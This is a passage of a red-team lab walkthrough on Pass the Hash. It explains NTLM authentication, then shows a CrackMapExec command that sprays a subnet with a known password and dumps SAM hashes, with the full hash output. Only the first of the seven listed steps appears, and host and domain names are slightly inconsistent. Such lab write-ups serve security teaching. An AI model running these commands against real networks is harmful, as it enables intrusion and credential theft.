# Pass The Hash

**Date:** May 2026  
**Author:** ShahinSecLab  
**Category:** Network Attack / Credential Capture  
**Difficulty:** Easy  
**Tools:** Responder, Hashcat 

## Table of Contents

```
- [Overview](#whats-the-point)
- [How NTLM Auth Actually Works](#how-ntlm-auth-actually-works)
- [Lab Setup](#lab-setup)
- [Step 1 — Spray Network and Dump SAM Hashes with CrackMapExec](#step-1--spray-network-and-dump-sam-hashes-with-crackmapexec)
- [Step 2 — Deeper Dump with secretsdump](#step-2--deeper-dump-with-secretsdump)
- [Step 3 — Save the Hashes](#step-3--save-the-hashes)
- [Step 4 — Crack the Hashes with Hashcat](#step-4--crack-the-hashes-with-hashcat)
- [Step 5 — Open the Hash File Again and Copy the NT Hash](#step-5--open-the-hash-file-again-and-copy-the-nt-hash)
- [Step 6 — Pass the Hash with CrackMapExec](#step-6--pass-the-hash-with-crackmapexec)
- [Step 7 — Get a Shell with psexec](#step-7--get-a-shell-with-psexec)
- [Full Attack Summary](#full-attack-summary)
```


## Overview

Pass the Hash is one of those attacks that sounds complicated but is actually pretty straightforward once you get it. The short version: Windows stores your password as a hash, and when you authenticate over the network, it uses that hash — not your actual password. So if you steal someone's hash, you can log in as them without ever knowing their password.
No cracking. No brute forcing. Just grab the hash and use it.
It's been around since the late 90s and it's still one of the go-to moves for moving sideways through a Windows domain. Once you're on one machine, PtH can get you to every other machine where that account has admin rights.

## How NTLM Auth Actually Works

When Windows needs to prove who you are over the network, it uses NTLM. Here's the back-and-forth:

```
Client                          Server
  |                                |
  |---- "Hey I want to log in" --> |
  |<--- "Prove it, here's a nonce" |
  |---- Hash(your_hash + nonce) -> |
  |<--- "OK you're in"             |
  ```

The thing to notice: the server never asks for your password. It asks for a response that was computed using your hash. So if you have the hash, you can compute the same response. The server can't tell the difference.
Windows uses MD4 to turn your password into a hash (this is the NT hash). That hash lives in memory while you're logged in, sitting in a process called LSASS. That's exactly where tools like Mimikatz go looking.

## Lab Setup

 ```
| Machine | Operating System |         Role          |    Ip         |
|---------|------------------|-----------------------|---------------|
| Attacker| Kali Linux       | Attacker machine      | 192.168.5.128 |
| Server  | Windows Server   | Domain Controller     | 192.168.5.134 |
| Victim  | Windows 10       | Domain joined machine | 192.168.5.135 |
 ```

## Step 1 — First Scan With CrackMapExec and Pull Hashes

I had rahimkhan's password from earlier. Ran CrackMapExec across the whole subnet to see which machines I could get into, and added --sam to pull hashes from any machine it logged into:

```bash
crackmapexec smb 192.168.5.0/24 -u rahimkhan -d READTEAMBD.local -p Password1 --sam
```
Output:

```
SMB         192.168.5.136   445    VICTIM-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-2) (domain:READTEAMBD.local) (signing:False) (SMBv1:False)
SMB         192.168.5.135   445    VICTIM-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:VICTIM-1) (domain:READTEAMBD.local) (signing:False) (SMBv1:False)
SMB         192.168.5.134   445    REDTEAMBD-DC     [*] Windows Server 2022 Build 20348 x64 (name:REDTEAMBD-DC) (domain:READTEAMBD.local) (signing:True) (SMBv1:False)
SMB         192.168.5.136   445    VICTIM-2         [+] READTEAMBD.local\rahimkhan:Password1 (Pwn3d!)
SMB         192.168.5.135   445    VICTIM-1         [+] READTEAMBD.local\rahimkhan:Password1 (Pwn3d!)
SMB         192.168.5.134   445    REDTEAMBD-DC     [+] READTEAMBD.local\rahimkhan:Password1 
SMB         192.168.5.136   445    VICTIM-2         [+] Dumping SAM hashes
SMB         192.168.5.135   445    VICTIM-1         [+] Dumping SAM hashes
SMB         192.168.5.135   445    VICTIM-1         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.135   445    VICTIM-1         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.135   445    VICTIM-1         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.135   445    VICTIM-1         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58de7b52b01e171824c8aeaa55fb1a89:::
SMB         192.168.5.135   445    VICTIM-1         rahim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.135   445    VICTIM-1         [+] Added 5 SAM hashes to the database
SMB         192.168.5.136   445    VICTIM-2         Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.136   445    VICTIM-2         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.136   445    VICTIM-2         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.136   445    VICTIM-2         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6f3ff0667b23a61adbffbe71a1e8dd8b:::
SMB         192.168.5.136   445    VICTIM-2         defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:337b1d18e8d0a8405c907048fdfbbae2:::
SMB         192.168.5.136   445    VICTIM-2         karim:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         192.168.5.136   445    VICTIM-2         [+] Added 6 SAM hashes to the database
```
                                                                                              